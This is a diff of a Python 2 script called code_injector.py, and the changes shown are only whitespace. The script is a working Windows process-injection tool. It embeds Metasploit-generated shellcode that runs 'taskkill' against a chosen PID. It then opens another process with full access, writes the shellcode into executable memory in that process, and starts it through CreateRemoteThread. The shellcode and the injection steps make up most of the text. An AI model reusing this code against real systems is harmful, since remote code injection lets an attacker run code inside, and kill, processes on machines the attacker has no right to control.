@@ -10,10 +10,10 @@ pid = int(sys.argv[1])
 pid_to_kill = sys.argv[2]
 
 if not sys.argv[1] or not sys.argv[2]:
-    print "Code Injector: ./code_injector.py <PID to inject> <PID to kill>"
-    sys.exit(0)
+		print "Code Injector: ./code_injector.py <PID to inject> <PID to kill>"
+		sys.exit(0)
 
-#/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA 
+#/* win32_exec -	EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA
 #Size=159 Encoder=None http://metasploit.com */
 shellcode = \
 "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
@@ -30,26 +30,26 @@ shellcode = \
 padding = 4 - (len(pid_to_kill))
 replace_value = pid_to_kill + ( "\x00" * padding)
 replace_string = "\x41" *4
-shellcode  = shellcode.replace(replace_string, replace_value)
+shellcode	 = shellcode.replace(replace_string, replace_value)
 code_size = len(shellcode)
 h_process =kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,int(pid))
 
 if not h_process:
-    print "[*] Couldn't acquire a handle to PID: %s" % pid
-    sys.exit(0)
+		print "[*] Couldn't acquire a handle to PID: %s" % pid
+		sys.exit(0)
 
 arg_address =kernel32.VirtualAllocEx(h_process,0,code_size, \
-                                     VIRTUAL_MEM , PAGE_EXECUTE_READWRITE)
+																		 VIRTUAL_MEM , PAGE_EXECUTE_READWRITE)
 
 written = c_int(0)
 kernel32.WriteProcessMemory(h_process,arg_address,shellcode,\
-                            code_size,byref(written))
+														code_size,byref(written))
 
 thread_id = c_ulong(0)
 if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,\
-                                    None,0,byref(thread_id)):
-    print "[*] Failed to inject process-killing shellcode. Exiting."
-    sys.exit(0)
+																		None,0,byref(thread_id)):
+		print "[*] Failed to inject process-killing shellcode. Exiting."
+		sys.exit(0)
 
 print "[*] Remote thread created with a thread ID of : 0x%08x" % thread_id.value
 print "[*] Process %s should not be running anymore!" % pid_to_kill
